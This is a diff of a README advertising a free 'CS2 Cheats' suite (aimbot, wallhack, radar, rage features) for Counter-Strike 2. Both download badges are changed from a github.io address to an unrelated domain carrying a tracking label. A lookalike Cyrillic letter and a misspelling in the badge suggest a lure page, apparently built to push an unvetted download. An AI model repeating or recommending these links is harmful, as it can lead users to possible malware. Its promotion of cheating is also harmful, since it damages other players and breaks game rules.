@@ -2,7 +2,7 @@
 
 The **CS2 Cheats** package is a feature-rich suite of hacks and enhancements designed to give you a major advantage in **Counter-Strike 2**. Whether you're looking for legit-style assistance to climb ranks or full-blown rage features to dominate casual lobbies, this toolset includes everything from aimbot and wallhack to radar, no recoil, and much more.
 
-[![Download СS2 Cheats](https://img.shields.io/badge/Download-CS2%20Chets-blueviolet)](https://cs2-cheats-free.github.io/.github/)
+[![Download СS2 Cheats](https://img.shields.io/badge/Download-CS2%20Chets-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 ## 🔧 Key Features:
 
@@ -60,4 +60,4 @@ The **CS2 Cheats** package is a feature-rich suite of hacks and enhancements des
 - 😈 Dominate casual servers with rage features
 - 💡 Experiment with different cheats in private lobbies
 
-[![Download СS2 Cheats](https://img.shields.io/badge/Download-CS2%20Chets-blueviolet)](https://cs2-cheats-free.github.io/.github/)
+[![Download СS2 Cheats](https://img.shields.io/badge/Download-CS2%20Chets-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
